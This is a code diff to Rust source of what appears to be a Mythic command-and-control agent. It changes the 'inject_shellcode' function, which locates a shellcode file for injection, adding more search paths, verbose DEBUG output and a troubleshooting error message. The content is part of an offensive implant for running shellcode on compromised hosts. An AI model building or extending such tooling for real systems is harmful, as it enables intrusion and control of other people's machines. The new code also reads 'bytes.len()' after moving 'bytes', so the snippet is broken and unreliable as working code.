@@ -1,5 +1,6 @@
 use std::mem;
 use std::ptr;
+use std::fs;
 use crate::{AgentTask, mythic_success, mythic_error};
 use crate::agent::ShinjectArgs;
 
@@ -40,33 +41,52 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn s
     let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;
 
     // The shellcode field contains the file ID from Mythic
-    // We need to download the file from Mythic first
-    // For now, we'll try to read the file from common locations
-    // In a real implementation, you would use Mythic's file download mechanism
+    // When delete_after_fetch=True is set in shinject.py, Mythic should download the file
+    // to the agent's current working directory or temp directory
     
     let mut shellcode_bytes = Vec::new();
+    let mut found_file = false;
     
-    // Create longer-lived path bindings
-    let temp_path = std::env::temp_dir().join(&args.shellcode);
-    let current_path = std::env::current_dir()?.join(&args.shellcode);
+    // Debug: Print what we're looking for
+    eprintln!("DEBUG: Looking for shellcode file with ID: {}", args.shellcode);
+    eprintln!("DEBUG: Current working directory: {}", std::env::current_dir()?.to_string_lossy());
+    eprintln!("DEBUG: Temp directory: {}", std::env::temp_dir().to_string_lossy());
     
-    // Try to read the file from various possible locations
+    // Check common locations where Mythic downloads files
     let possible_paths = vec![
-        std::path::Path::new(&args.shellcode),
-        &temp_path,
-        &current_path,
+        // Current working directory (most common)
+        std::env::current_dir()?.join(&args.shellcode),
+        // Temp directory
+        std::env::temp_dir().join(&args.shellcode),
+        // Downloads directory
+        std::env::home_dir().unwrap_or_default().join("Downloads").join(&args.shellcode),
+        // Direct path (in case it's already a full path)
+        std::path::Path::new(&args.shellcode).to_path_buf(),
+        // Check if it's a relative path in current directory
+        std::env::current_dir()?.join(".").join(&args.shellcode),
     ];
     
-    let mut found_file = false;
-    for path in possible_paths {
+    // Debug: Print search locations
+    for (i, path) in possible_paths.iter().enumerate() {
+        eprintln!("DEBUG: Search location {}: {}", i + 1, path.to_string_lossy());
+        eprintln!("DEBUG: File exists: {}", path.exists());
+    }
+    
+    // Try to read the file from various possible locations
+    for path in &possible_paths {
         if path.exists() {
-            match std::fs::read(path) {
+            eprintln!("DEBUG: Found file at: {}", path.to_string_lossy());
+            match fs::read(path) {
                 Ok(bytes) => {
                     shellcode_bytes = bytes;
                     found_file = true;
+                    eprintln!("DEBUG: Successfully read {} bytes from file", bytes.len());
                     break;
                 }
-                Err(_) => continue,
+                Err(e) => {
+                    eprintln!("DEBUG: Failed to read file {}: {}", path.to_string_lossy(), e);
+                    continue;
+                }
             }
         }
     }
@@ -75,11 +95,14 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn s
         return Ok(mythic_error!(
             task.id,
             format!(
-                "Shellcode file '{}' not found. \n\nTo use shinject:\n1. Upload your shellcode file to Mythic\n2. Use the file ID from Mythic in the shinject command\n3. The file will be downloaded to the agent automatically\n\nCurrent search locations:\n- {}\n- {}\n- {}", 
+                "Shellcode file '{}' not found.\n\nDEBUG INFO:\n- File ID: {}\n- Searched locations:\n{}\n\nTROUBLESHOOTING:\n1. Make sure the file was uploaded to Mythic\n2. Check that delete_after_fetch=True is working\n3. Verify the agent can access the file locations\n4. Try uploading the file again",
                 args.shellcode,
-                std::path::Path::new(&args.shellcode).to_string_lossy(),
-                temp_path.to_string_lossy(),
-                current_path.to_string_lossy()
+                args.shellcode,
+                possible_paths.iter()
+                    .enumerate()
+                    .map(|(i, path)| format!("  {}. {} (exists: {})", i + 1, path.to_string_lossy(), path.exists()))
+                    .collect::<Vec<_>>()
+                    .join("\n")
             )
         ));
     }
